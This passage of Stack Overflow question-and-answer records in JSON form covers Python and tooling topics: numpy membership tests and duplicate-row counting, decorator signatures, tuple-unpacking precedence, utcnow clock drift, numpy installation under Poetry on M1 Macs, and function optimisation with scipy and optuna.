    "AcceptedAnswer": "From RCS manual (1. Overview)\n\n[RCS] can handle text as well as binary files, although functionality is reduced for the latter.\n\nRCS seems a good option worth to try.\nI work for a Foundation which has been using RCS to keep under version control tens of thousands of completely unrelated files (git or hg are not an option). Mostly text, but also some media files, which are binary in nature.\nRCS does work quite well with binary files, only make sure not to use the Substitute mode options, to avoid inadvertently substituting binary bits that looks like $ Id.\nTo see if this could work for you, you could for example try with a Photoshop image, put it under version control with RCS. Then change a part, or add a layer, and commit the change. You could then verify how well RCS can manage binary files for you.\nRCS has been serving us quite well. It is well maintained, reliable, predictable, and definitely worth a try.\n"
}
{
    "Id": 71990420,
    "PostTypeId": 1,
    "Title": "How do I efficiently find which elements of a list are in another list?",
    "Body": "I want to know which elements of list_1 are in list_2. I need the output as an ordered list of booleans. But I want to avoid for loops, because both lists have over 2 million elements.\nThis is what I have and it works, but it's too slow:\nlist_1 = [0,0,1,2,0,0]\nlist_2 = [1,2,3,4,5,6]\n\nbooleans = []\nfor i in list_1:\n   booleans.append(i in list_2)\n\n# booleans = [False, False, True, True, False, False]\n\nI could split the list and use multithreading, but I would prefer a simpler solution if possible. I know some functions like sum() use vector operations. I am looking for something similar.\nHow can I make my code more efficient?\n",
    "AcceptedAnswerId": 71990529,
    "AcceptedAnswer": "If you want to use a vector approach you can also use Numpy isin. It's not the fastest method, as demonstrated by oda's excellent post, but it's definitely an alternative to consider.\nimport numpy as np\n\nlist_1 = [0,0,1,2,0,0]\nlist_2 = [1,2,3,4,5,6]\n\na1 = np.array(list_1)\na2 = np.array(list_2)\n\nnp.isin(a1, a2)\n# array([False, False,  True,  True, False, False])\n\n"
}
{
    "Id": 72236445,
    "PostTypeId": 1,
    "Title": "How can I wrap a python function in a way that works with with inspect.signature?",
    "Body": "Some uncontroversial background experimentation up front:\nimport inspect\n\ndef func(foo, bar):\n  pass\n\nprint(inspect.signature(func))  # Prints \"(foo, bar)\" like you'd expect\n\ndef decorator(fn):\n  def _wrapper(baz, *args, *kwargs):\n    fn(*args, **kwargs)\n\n  return _wrapper\n\nwrapped = decorator(func)\nprint(inspect.signature(wrapped))  # Prints \"(baz, *args, **kwargs)\" which is totally understandable\n\nThe Question\nHow can implement my decorator so that print(inspect.signature(wrapped)) spits out \"(baz, foo, bar)\"?  Can I build _wrapper dynamically somehow by adding the arguments of whatever fn is passed in, then gluing baz on to the list?\nThe answer is NOT\ndef decorator(fn):\n  @functools.wraps(fn)\n  def _wrapper(baz, *args, *kwargs):\n    fn(*args, **kwargs)\n\n  return _wrapper\n\nThat give \"(foo, bar)\" again - which is totally wrong.  Calling wrapped(foo=1, bar=2) is a type error - \"Missing 1 required positional argument: 'baz'\"\nI don't think it's necessary to be this pedantic, but\ndef decorator(fn):\n  def _wrapper(baz, foo, bar):\n    fn(foo=foo, bar=bar)\n\n  return _wrapper\n\nIs also not the answer I'm looking for - I'd like the decorator to work for all functions.\n",
    "AcceptedAnswerId": 72242606,
    "AcceptedAnswer": "You can use __signature__ (PEP) attribute to modify returned signature of wrapped object. For example:\nimport inspect\n\n\ndef func(foo, bar):\n    pass\n\n\ndef decorator(fn):\n    def _wrapper(baz, *args, **kwargs):\n        fn(*args, **kwargs)\n\n    f = inspect.getfullargspec(fn)\n\n    fn_params = []\n    if f.args:\n        for a in f.args:\n            fn_params.append(\n                inspect.Parameter(a, inspect.Parameter.POSITIONAL_OR_KEYWORD)\n            )\n\n    if f.varargs:\n        fn_params.append(\n            inspect.Parameter(f.varargs, inspect.Parameter.VAR_POSITIONAL)\n        )\n\n    if f.varkw:\n        fn_params.append(\n            inspect.Parameter(f.varkw, inspect.Parameter.VAR_KEYWORD)\n        )\n\n    _wrapper.__signature__ = inspect.Signature(\n        [\n            inspect.Parameter(\"baz\", inspect.Parameter.POSITIONAL_OR_KEYWORD),\n            *fn_params,\n        ]\n    )\n    return _wrapper\n\n\nwrapped = decorator(func)\nprint(inspect.signature(wrapped))\n\nPrints:\n(baz, foo, bar)\n\n\nIf the func is:\ndef func(foo, bar, *xxx, **yyy):\n    pass\n\nThen print(inspect.signature(wrapped)) prints:\n(baz, foo, bar, *xxx, **yyy)\n\n"
}
{
    "Id": 72804712,
    "PostTypeId": 1,
    "Title": "How to accelerate numpy.unique and provide both counts and duplicate row indices",
    "Body": "I am attempting to find duplicate rows in a numpy array.  The following code replicates the structure of my array which has n rows, m columns, and nz non-zero entries per row:\nimport numpy as np\nimport random\nimport datetime\n\n\ndef create_mat(n, m, nz):\n    sample_mat = np.zeros((n, m), dtype='uint8')\n    random.seed(42)\n    for row in range(0, n):\n        counter = 0\n        while counter < nz:\n            random_col = random.randrange(0, m-1, 1)\n            if sample_mat[row, random_col] == 0:\n                sample_mat[row, random_col] = 1\n                counter += 1\n    test = np.all(np.sum(sample_mat, axis=1) == nz)\n    print(f'All rows have {nz} elements: {test}')\n    return sample_mat\n\nThe code I am attempting to optimize is as follows:\nif __name__ == '__main__':\n    threshold = 2\n    mat = create_mat(1800000, 108, 8)\n\n    print(f'Time: {datetime.datetime.now()}')\n    unique_rows, _, duplicate_counts = np.unique(mat, axis=0, return_counts=True, return_index=True)\n    duplicate_indices = [int(x) for x in np.argwhere(duplicate_counts >= threshold)]\n    print(f'Time: {datetime.datetime.now()}')\n\n    print(f'Unique rows: {len(unique_rows)} Sample inds: {duplicate_indices[0:5]} Sample counts: {duplicate_counts[0:5]}')\n    print(f'Sample rows:')\n    print(unique_rows[0:5])\n\n\nMy output is as follows:\nAll rows have 8 elements: True\nTime: 2022-06-29 12:08:07.320834\nTime: 2022-06-29 12:08:23.281633\nUnique rows: 1799994 Sample inds: [508991, 553136, 930379, 1128637, 1290356] Sample counts: [1 1 1 1 1]\nSample rows:\n[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 1 1 0 0 1 1 0 0 0 1 0 0 0 0 0 0 1 0 1 0]\n [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 1 1 0 0 0 0 0 1 1 1 1 0 0 0 0 1 0 0 0 0 0]\n [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 0 0 0 0 1 0 1 0 0 1 0 0 0 1 0 1 0 1 0 0 0]\n [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 1 0 1 1 0 0 0 0 1 1 0 0 0 0 0 0 1 1 0 1 0 0 0 0 0]\n [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 1 1 0 0 0 0 1 0 0 0 1 0 1 1 0 0 0 0 0 1 0 0 0 0 1 0]]\n\nI have considered using numba, but the challenge is that it does not operate using an axis parameter.  Similarly, conversion to list and utilization of sets is an option, but then looping through to perform the duplicate counts seems \"unpythonic\".\nGiven that I need to run this code multiple times (since I am modifying the numpy array and then needing to re-search for duplicates), the time is critical. I have also tried to use multiprocessing against this step but the np.unique seems to be blocking (i.e. even when I try to run multiple versions of this, I end up constrained to one thread running at 6% CPU capacity while the other threads sit idle).\n",
    "AcceptedAnswerId": 72836634,
    "AcceptedAnswer": "Step 1: bit packing\nSince your matrix only contains binary values, you can aggressively pack the bits into uint64 values so to perform a much more efficient sort then. Here is a Numba implementation:\nimport numpy as np\nimport numba as nb\n\n@nb.njit('(uint8[:,::1],)', parallel=True)\ndef pack_bits(mat):\n    n, m = mat.shape\n    res = np.zeros((n, (m+63)//64), np.uint64)\n    for i in nb.prange(n):\n        for bj in range(0, m, 64):\n            val = np.uint64(0)\n            if bj + 64 <= m:\n                # Fast case\n                for j in range(64):\n                    val += np.uint64(mat[i, bj+j]) << (63 - j)\n            else:\n                # Slow case (boundary)\n                for j in range(m - bj):\n                    val += np.uint64(mat[i, bj+j]) << (63 - j)\n            res[i, bj//64] = val\n    return res\n\n@nb.njit('(uint64[:,::1], int_)', parallel=True)\ndef unpack_bits(mat, m):\n    n = mat.shape[0]\n    assert mat.shape[1] == (m+63)//64\n    res = np.zeros((n, m), np.uint64)\n    for i in nb.prange(n):\n        for bj in range(0, m, 64):\n            val = np.uint64(mat[i, bj//64])\n            if bj + 64 <= m:\n                # Fast case\n                for j in range(64):\n                    res[i, bj+j] = np.uint8((val >> (63 - j)) & 1)\n            else:\n                # Slow case (boundary)\n                for j in range(m - bj):\n                    res[i, bj+j] = np.uint8((val >> (63 - j)) & 1)\n    return res\n\nThe np.unique function can be called on the much smaller packed array like in the initial code (except the resulting sorted array is a packed one and need to be unpacked). Since you do not need the indices, it is better not to compute it. Thus, return_index=True can be removed. Additionally, only the required values can be unpacked (unpacking is a bit more expensive than packing because writing a big matrix is more expensive than reading an existing one).\nif __name__ == '__main__':\n    threshold = 2\n    n, m = 1800000, 108\n    mat = create_mat(n, m, 8)\n\n    print(f'Time: {datetime.datetime.now()}')\n    packed_mat = pack_bits(mat)\n    duplicate_packed_rows, duplicate_counts = np.unique(packed_mat, axis=0, return_counts=True)\n    duplicate_indices = [int(x) for x in np.argwhere(duplicate_counts >= threshold)]\n    print(f'Time: {datetime.datetime.now()}')\n\n    print(f'Duplicate rows: {len(duplicate_rows)} Sample inds: {duplicate_indices[0:5]} Sample counts: {duplicate_counts[0:5]}')\n    print(f'Sample rows:')\n    print(unpack_bits(duplicate_packed_rows[0:5], m))\n\n\nStep 2: np.unique optimizations\nThe np.unique call is sub-optimal as it performs multiple expensive internal sorting steps. Not all of them are needed in your specific case and some step can be optimized.\nA more efficient implementation consists in sorting the last column during a first step, then sorting the previous column, and so on until the first column is sorted similar to what a Radix sort does. Note that the last column can be sorted using a non-stable algorithm (generally faster) but the others need a stable one. This method is still sub-optimal as argsort calls are slow and the current implementation does not use multiple threads yet. Unfortunately, Numpy does not proving any efficient way to sort rows of a 2D array yet. While it is possible to reimplement this in Numba, this is cumbersome, a bit tricky to do and bug prone. Not to mention Numba introduce some overheads compared to a native C/C++ code. Once sorted, the unique/duplicate rows can be tracked and counted. Here is an implementation:\ndef sort_lines(mat):\n    n, m = mat.shape\n\n    for i in range(m):\n        kind = 'stable' if i > 0 else None\n        mat = mat[np.argsort(mat[:,m-1-i], kind=kind)]\n\n    return mat\n\n@nb.njit('(uint64[:,::1],)', parallel=True)\ndef find_duplicates(sorted_mat):\n    n, m = sorted_mat.shape\n    assert m >= 0\n\n    isUnique = np.zeros(n, np.bool_)\n    uniqueCount = 1\n    if n > 0:\n        isUnique[0] = True\n    for i in nb.prange(1, n):\n        isUniqueVal = False\n        for j in range(m):\n            isUniqueVal |= sorted_mat[i, j] != sorted_mat[i-1, j]\n        isUnique[i] = isUniqueVal\n        uniqueCount += isUniqueVal\n\n    uniqueValues = np.empty((uniqueCount, m), np.uint64)\n    duplicateCounts = np.zeros(len(uniqueValues), np.uint64)\n\n    cursor = 0\n    for i in range(n):\n        cursor += isUnique[i]\n        for j in range(m):\n            uniqueValues[cursor-1, j] = sorted_mat[i, j]\n        duplicateCounts[cursor-1] += 1\n\n    return uniqueValues, duplicateCounts\n\nThe previous np.unique call can be replaced by find_duplicates(sort_lines(packed_mat)).\nStep 3: GPU-based np.unique\nWhile implementing a fast algorithm to sort row is not easy on CPU with Numba and Numpy, one can simply use CuPy to do that on the GPU assuming a Nvidia GPU is available and CUDA is installed (as well as CuPy). This solution has the benefit of being simple and significantly more efficient. Here is an example:\nimport cupy as cp\n\ndef cupy_sort_lines(mat):\n    cupy_mat = cp.array(mat)\n    return cupy_mat[cp.lexsort(cupy_mat.T[::-1,:])].get()\n\nThe previous sort_lines call can be replaced by cupy_sort_lines.\n\nResults\nHere are the timings on my machine with a 6-core i5-9600KF CPU and a Nvidia 1660 Super GPU:\nInitial version:        15.541 s\nOptimized packing:       0.982 s\nOptimized np.unique:     0.634 s\nGPU-based sorting:       0.143 s   (require a Nvidia GPU)\n\nThus, the CPU-based optimized version is about 25 times faster and the GPU-based one is 109 times faster. Note that the sort take a significant time in all versions. Also, please note that the unpacking is not included in the benchmark (as seen in the provided code). It takes a negligible time as long as only few rows are unpacked and not all the full array (which takes roughtly ~200 ms on my machine). This last operation can be further optimized at the expense of a significantly more complex implementation.\n"
}
{
    "Id": 72845828,
    "PostTypeId": 1,
    "Title": "Priority of tuple (un)packing with inline if-else",
    "Body": "Apologies in advance for the obscure title. I wasn't sure how to phrase what I encountered.\nImagine that you have a title of a book alongside its author, separated by -, in a variable title_author. You scraped this information from the web so it might very well be that this item is None. Obviously you would like to separate the title from the author, so you'd use split. But in case title_author is None to begin with, you just want both title and author to be None.\nI figured that the following was a good approach:\ntitle_author = \"In Search of Lost Time - Marcel Proust\"\ntitle, author = title_author.split(\"-\", 1) if title_author else None, None\nprint(title, author)\n# ['In Search of Lost Time ', ' Marcel Proust'] None\n\nBut to my surprise, title now was the result of the split and author was None. The solution is to explicitly indicate that the else clause is a tuple by means of parentheses.\ntitle, author = title_author.split(\"-\", 1) if title_author else (None, None)\nprint(title, author) \n# In Search of Lost Time   Marcel Proust\n\nSo why is this happening? What is the order of execution here that lead to the result in the first case?\n",
    "AcceptedAnswerId": 72845910,
    "AcceptedAnswer": "title, author = title_author.split(\"-\", 1) if title_author else None, None\n\nis the same as:\ntitle, author = (title_author.split(\"-\", 1) if title_author else None), None\n\nTherefore, author is always None\n\nExplaination:\nFrom official doc\n\nAn assignment statement evaluates the expression list (remember that\nthis can be a single expression or a comma-separated list, the latter\nyielding a tuple) and assigns the single resulting object to each of\nthe target lists, from left to right.\n\nThat is to say, the interrupter will look for (x,y)=(a,b) and assign value as x=a and y=b.\nIn your case, there are two interpretation, the main differece is that :\n\ntitle, author = (title_author.split(\"-\", 1) if title_author else None), None\nis assigning two values (a list or a None and a None) to two variables and no unpacking is needed.\n\ntitle, author = title_author.split(\"-\", 1) if title_author else (None, None) is actually assigning one value (a list or a tuple) to two variable, which need an unpacking step to map two variables to the two values in the list/tuple.\n\n\nAs option 1 can be completed without unpacking, i.e. less operation, the interrupter will go with option 1 without explicit instructions.\n"
}
{
    "Id": 72369250,
    "PostTypeId": 1,
    "Title": "Weird datetime.utcnow() bug",
    "Body": "Consider this simple Python script:\n$ cat test_utc.py\nfrom datetime import datetime\n\nfor i in range(10_000_000):\n    first = datetime.utcnow()\n    second = datetime.utcnow()\n\n    assert first <= second, f\"{first=} {second=} {i=}\"\n\nWhen I run it from the shell like python test_utc.py it finishes w/o errors, just as expected. However, when I run it in a Docker container the assertion fails:\n$ docker run -it --rm -v \"$PWD\":/code -w /code python:3.10.4 python test_utc.py\nTraceback (most recent call last):\n  File \"/code/test_utc.py\", line 7, in \n    assert first <= second, f\"{first=} {second=} {i=}\"\nAssertionError: first=datetime.datetime(2022, 5, 24, 19, 5, 1, 861308) second=datetime.datetime(2022, 5, 24, 19, 5, 1, 818270) i=1818860\n\nHow is it possible?\nP.S. a colleague has reported that increasing the range parameter to 100_000_000 makes it fail in the shell on their mac as well (but not for me).\n",
    "AcceptedAnswerId": 72369605,
    "AcceptedAnswer": "utcnow refers to now refers to today refers to fromtimestamp refers to time, which says:\n\nWhile this function normally returns non-decreasing values, it can return a lower value than a previous call if the system clock has been set back between the two calls.\n\nThe utcnow code also shows its usage of time:\ndef utcnow(cls):\n    \"Construct a UTC datetime from time.time().\"\n    t = _time.time()\n    return cls.utcfromtimestamp(t)\n\nSuch system clock updates are also why monotonic exists, which says:\n\nReturn the value (in fractional seconds) of a monotonic clock, i.e. a clock that cannot go backwards. The clock is not affected by system clock updates.\n\nAnd utcnow has no such guarantee.\nYour computer doesn't have a perfect clock, every now and then it synchronizes via the internet with more accurate clocks, possibly adjusting it backwards. See for example answers here.\nAnd looks like Docker makes it worse, see for example Addressing Time Drift in Docker Desktop for Mac from the Docker blog. Excerpt:\n\nmacOS doesn\u2019t have native container support. The helper VM has its own internal clock, separate from the host\u2019s clock. When the two clocks drift apart then suddenly commands which rely on the time, or on file timestamps, may start to behave differently\n\nLastly, you can increase your chance to catch a backwards update when one occurs. If one occurs not between getting first and second but between second and the next first, you'll miss it! Below code fixes that issue and is also micro-optimized (including removing the utcnow middle man) so it checks faster / more frequently:\nimport time\nfrom itertools import repeat\n\ndef function():\n    n = 10_000_000\n    reps = repeat(1, n)\n    now = time.time\n    first = now()\n    for _ in reps:\n        second = now()\n        assert first <= second, f\"{first=} {second=} i={n - sum(reps)}\"\n        first = second\nfunction()\n\n"
}
{
    "Id": 71764027,
    "PostTypeId": 1,
    "Title": "Numpy installation fails when installing with Poetry on M1 and macOS",
    "Body": "I have a Numpy as a dependency in Poetry pyproject.toml file and it fails to install.\n  error: the clang compiler does not support 'faltivec', please use -maltivec and include altivec.h explicitly\n              error: Command \"clang -Wno-unused-result -Wsign-compare -Wunreachable-code -fno-common -dynamic -DNDEBUG -g -fwrapv -O3 -Wall -isysroot /Library/Developer/CommandLineTools/SDKs/MacOSX12.sdk -DNPY_INTERNAL_BUILD=1 -DHAVE_NPY_CONFIG_H=1 -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE=1 -D_LARGEFILE64_SOURCE=1 -DNO_ATLAS_INFO=3 -DHAVE_CBLAS -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/umath -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/npymath -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/common -Inumpy/core/include -Ibuild/src.macosx-12-arm64-3.9/numpy/core/include/numpy -Inumpy/core/src/common -Inumpy/core/src -Inumpy/core -Inumpy/core/src/npymath -Inumpy/core/src/multiarray -Inumpy/core/src/umath -Inumpy/core/src/npysort -I/Users/moo/Library/Caches/pypoetry/virtualenvs/dex-ohlcv-qY1n4duk-py3.9/include -I/opt/homebrew/Cellar/python@3.9/3.9.12/Frameworks/Python.framework/Versions/3.9/include/python3.9 -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/common -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/npymath -c numpy/core/src/multiarray/array_assign_scalar.c -o build/temp.macosx-12-arm64-3.9/numpy/core/src/multiarray/array_assign_scalar.o -MMD -MF build/temp.macosx-12-arm64-3.9/numpy/core/src/multiarray/array_assign_scalar.o.d -faltivec -I/System/Library/Frameworks/vecLib.framework/Headers\" failed with exit status 1\n              [end of output]\n        \n          note: This error originates from a subprocess, and is likely not a problem with pip.\n          ERROR: Failed building wheel for numpy\n        Failed to build numpy\n\n\nmacOS Big Sur\nPython 3.9 installed through Homebrew\n\nHow to solve it?\nIf I install Numpy with pip it installs fine.\n",
    "AcceptedAnswerId": 71764028,
    "AcceptedAnswer": "Make sure you have OpenBLAS installed from Homebrew:\nbrew install openblas\n\nThen before running any installation script, make sure you tell your shell environment to use Homebrew OpenBLAS installation\nexport OPENBLAS=\"$(brew --prefix openblas)\" \npoetry install\n\nIf you get an error\n                File \"/private/var/folders/tx/50wn88yd40v2_6_7fvfr98z00000gn/T/pip-build-env-uq7qd2ba/overlay/lib/python3.9/site-packages/wheel/bdist_wheel.py\", line 252, in get_tag\n                  plat_name = get_platform(self.bdist_dir)\n                File \"/private/var/folders/tx/50wn88yd40v2_6_7fvfr98z00000gn/T/pip-build-env-uq7qd2ba/overlay/lib/python3.9/site-packages/wheel/bdist_wheel.py\", line 48, in get_platform\n                  result = calculate_macosx_platform_tag(archive_root, result)\n                File \"/private/var/folders/tx/50wn88yd40v2_6_7fvfr98z00000gn/T/pip-build-env-uq7qd2ba/overlay/lib/python3.9/site-packages/wheel/macosx_libfile.py\", line 356, in calculate_macosx_platform_tag\n                  assert len(base_version) == 2\n              AssertionError\n\nThis should have been fixed in the recent enough Python packaging tools.\nMake sure\n\nPoetry is recent enough version\nNumpy is recent enough version\nAny dependency using Numpy, like Scipy or Pyarrrow are also the most recent version\n\nFor example in your pyproject.toml\n[tool.poetry.dependencies]\n# For Scipy compatibility\npython = \">=3.9,<3.11\"\n\nscipy = \"^1.8.0\"\npyarrow = \"^7.0.0\"\n\nEven if this still fails you can try to preinstall scipy with pip before running poetry install in Poetry virtualenv (enter with poetry shell) This should pick up the precompiled scipy wheel. When the precompiled wheel is present, Poetry should not try to install it again and then fail it the build step.\npoetry shell\npip install scipy\n\nCollecting scipy\n  Downloading scipy-1.8.0-cp39-cp39-macosx_12_0_arm64.whl (28.7 MB)\n     \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 28.7/28.7 MB 6.0 MB/s eta 0:00:00\nRequirement already satisfied: numpy=1.17.3 in /Users/moo/Library/Caches/pypoetry/virtualenvs/dex-ohlcv-qY1n4duk-py3.9/lib/python3.9/site-packages (from scipy) (1.22.3)\nInstalling collected packages: scipy\nSuccessfully installed scipy-1.8.0\n\nAfter this run Poetry normally:\npoetry install\n\n"
}
{
    "Id": 72193393,
    "PostTypeId": 1,
    "Title": "Find the value of variables to maximize return of function in Python",
    "Body": "I'd want to achieve similar result as how the Solver-function in Excel is working. I've been reading of Scipy optimization and been trying to build a function which outputs what I would like to find the maximal value of. The equation is based on four different variables which, see my code below:\nimport pandas as pd\nimport numpy as np\nfrom scipy import optimize\n\ncols = {\n    'Dividend2': [9390, 7448, 177], \n    'Probability': [341, 376, 452], \n    'EV': [0.53, 0.60, 0.55], \n    'Dividend': [185, 55, 755], \n    'EV2': [123, 139, 544],\n}\n\ndf = pd.DataFrame(cols)\n\ndef myFunc(params):\n    \"\"\"myFunc metric.\"\"\"\n    (ev, bv, vc, dv) = params\n    df['Number'] = np.where(df['Dividend2'] <= vc, 1, 0) \\\n                    + np.where(df['EV2'] <= dv, 1, 0)\n    df['Return'] =  np.where(\n        df['EV'] <= ev, 0, np.where(\n            df['Probability'] >= bv, 0, df['Number'] * df['Dividend'] - (vc + dv)\n        )\n    )\n    return -1 * (df['Return'].sum())\n\nb1 = [(0.2,4), (300,600), (0,1000), (0,1000)]\nstart = [0.2, 600, 1000, 1000]\nresult = optimize.minimize(fun=myFunc, bounds=b1, x0=start)\nprint(result)\n\nSo I'd like to find the maximum value of the column Return in df when changing the variables ev,bv,vc & dv. I'd like them to be between in the intervals of ev: 0.2-4, bv: 300-600, vc: 0-1000 & dv: 0-1000.\nWhen running my code it seem like the function stops at x0.\n",
    "AcceptedAnswerId": 72252081,
    "AcceptedAnswer": "Solution\nI will use optuna library to give you a solution to the type of problem you are trying to solve. I have tried using scipy.optimize.minimize and it appears that the loss-landscape is probably quite flat in most places, and hence the tolerances enforce the minimizing algorithm (L-BFGS-B) to stop prematurely.\n\nOptuna Docs: https://optuna.readthedocs.io/en/stable/index.html\n\nWith optuna, it rather straight forward. Optuna only requires an objective function and a study. The study send various trials to the objective function, which in turn, evaluates the metric of your choice.\nI have defined another metric function myFunc2 by mostly removing the np.where calls, as you can do-away with them (reduces number of steps) and make the function slightly faster.\n# install optuna with pip\npip install -Uqq optuna\n\nAlthough I looked into using a rather smooth loss landscape, sometimes it is necessary to visualize the landscape itself. The answer in section B elaborates on visualization. But, what if you want to use a smoother metric function? Section D sheds some light on this.\nOrder of code-execution should be:\n\nSections: C >> B >> B.1 >> B.2 >> B.3 >> A.1 >> A.2 >> D\n\nA. Building Intuition\nIf you create a hiplot (also known as a plot with parallel-coordinates) with all the possible parameter values as mentioned in the search_space for Section B.2, and plot the lowest 50 outputs of myFunc2, it would look like this:\n\nPlotting all such points from the search_space would look like this:\n\nA.1. Loss Landscape Views for Various Parameter-Pairs\nThese figures show that mostly the loss-landscape is flat for any two of the four parameters (ev, bv, vc, dv). This could be a reason why, only GridSampler (which brute-forces the searching process) does better, compared to the other two samplers (TPESampler and RandomSampler). Please click on any of the images below to view them enlarged. This could also be the reason why scipy.optimize.minimize(method=\"L-BFGS-B\") fails right off the bat.\n\n\n\n\n  01. dv-vc\n  02. dv-bv\n  03. dv-ev\n\n\n\n\n  04. bv-ev\n  05. cv-ev\n  06. vc-bv\n\n\n\n\n# Create contour plots for parameter-pairs\nstudy_name = \"GridSampler\"\nstudy = studies.get(study_name)\n\nviews = [(\"dv\", \"vc\"), (\"dv\", \"bv\"), (\"dv\", \"ev\"), \n         (\"bv\", \"ev\"), (\"vc\", \"ev\"), (\"vc\", \"bv\")]\n\nfor i, (x, y) in enumerate(views):\n    print(f\"Figure: {i}/{len(views)}\")\n    study_contour_plot(study=study, params=(x, y))\n\nA.2. Parameter Importance\n\nstudy_name = \"GridSampler\"\nstudy = studies.get(study_name)\n\nfig = optuna.visualization.plot_param_importances(study)\nfig.update_layout(title=f'Hyperparameter Importances: {study.study_name}', \n                  autosize=False,\n                  width=800, height=500,\n                  margin=dict(l=65, r=50, b=65, t=90))\nfig.show()\n\nB. Code\nSection B.3. finds the lowest metric -88.333 for:\n\n{'ev': 0.2, 'bv': 500.0, 'vc': 222.2222, 'dv': 0.0}\n\nimport warnings\nfrom functools import partial\nfrom typing import Iterable, Optional, Callable, List\n\nimport pandas as pd\nimport numpy as np\nimport optuna\nfrom tqdm.notebook import tqdm\n\nwarnings.filterwarnings(\"ignore\", category=optuna.exceptions.ExperimentalWarning)\noptuna.logging.set_verbosity(optuna.logging.WARNING)\n\nPARAM_NAMES: List[str] = [\"ev\", \"bv\", \"vc\", \"dv\",]\nDEFAULT_METRIC_FUNC: Callable = myFunc2\n\n\ndef myFunc2(params):\n    \"\"\"myFunc metric v2 with lesser steps.\"\"\"\n    global df # define as a global variable\n    (ev, bv, vc, dv) = params\n    df['Number'] = (df['Dividend2'] <= vc) * 1 + (df['EV2'] <= dv) * 1\n    df['Return'] =  (\n        (df['EV'] > ev) \n        * (df['Probability'] < bv) \n        * (df['Number'] * df['Dividend'] - (vc + dv))\n    )\n    return -1 * (df['Return'].sum())\n\n\ndef make_param_grid(\n        bounds: List[Tuple[float, float]], \n        param_names: Optional[List[str]]=None, \n        num_points: int=10, \n        as_dict: bool=True,\n    ) -> Union[pd.DataFrame, Dict[str, List[float]]]:\n    \"\"\"\n    Create parameter search space.\n\n    Example:\n    \n        grid = make_param_grid(bounds=b1, num_points=10, as_dict=True)\n    \n    \"\"\"\n    if param_names is None:\n        param_names = PARAM_NAMES # [\"ev\", \"bv\", \"vc\", \"dv\"]\n    bounds = np.array(bounds)\n    grid = np.linspace(start=bounds[:,0], \n                       stop=bounds[:,1], \n                       num=num_points, \n                       endpoint=True, \n                       axis=0)\n    grid = pd.DataFrame(grid, columns=param_names)\n    if as_dict:\n        grid = grid.to_dict()\n        for k,v in grid.items():\n            grid.update({k: list(v.values())})\n    return grid\n\n\ndef objective(trial, \n              bounds: Optional[Iterable]=None, \n              func: Optional[Callable]=None, \n              param_names: Optional[List[str]]=None):\n    \"\"\"Objective function, necessary for optimizing with optuna.\"\"\"\n    if param_names is None:\n        param_names = PARAM_NAMES\n    if (bounds is None):\n        bounds = ((-10, 10) for _ in param_names)\n    if not isinstance(bounds, dict):\n        bounds = dict((p, (min(b), max(b))) \n                        for p, b in zip(param_names, bounds))\n    if func is None:\n        func = DEFAULT_METRIC_FUNC\n\n    params = dict(\n        (p, trial.suggest_float(p, bounds.get(p)[0], bounds.get(p)[1])) \n        for p in param_names        \n    )\n    # x = trial.suggest_float('x', -10, 10)\n    return func((params[p] for p in param_names))\n\n\ndef optimize(objective: Callable, \n             sampler: Optional[optuna.samplers.BaseSampler]=None, \n             func: Optional[Callable]=None, \n             n_trials: int=2, \n             study_direction: str=\"minimize\",\n             study_name: Optional[str]=None,\n             formatstr: str=\".4f\",\n             verbose: bool=True):\n    \"\"\"Optimizing function using optuna: creates a study.\"\"\"\n    if func is None:\n        func = DEFAULT_METRIC_FUNC\n    study = optuna.create_study(\n        direction=study_direction, \n        sampler=sampler, \n        study_name=study_name)\n    study.optimize(\n        objective, \n        n_trials=n_trials, \n        show_progress_bar=True, \n        n_jobs=1,\n    )\n    if verbose:\n        metric = eval_metric(study.best_params, func=myFunc2)\n        msg = format_result(study.best_params, metric, \n                            header=study.study_name, \n                            format=formatstr)\n        print(msg)\n    return study\n\n\ndef format_dict(d: Dict[str, float], format: str=\".4f\") -> Dict[str, float]:\n    \"\"\"\n    Returns formatted output for a dictionary with \n    string keys and float values.\n    \"\"\"\n    return dict((k, float(f'{v:{format}}')) for k,v in d.items())\n\n\ndef format_result(d: Dict[str, float], \n                  metric_value: float, \n                  header: str='', \n                  format: str=\".4f\"): \n    \"\"\"Returns formatted result.\"\"\"\n    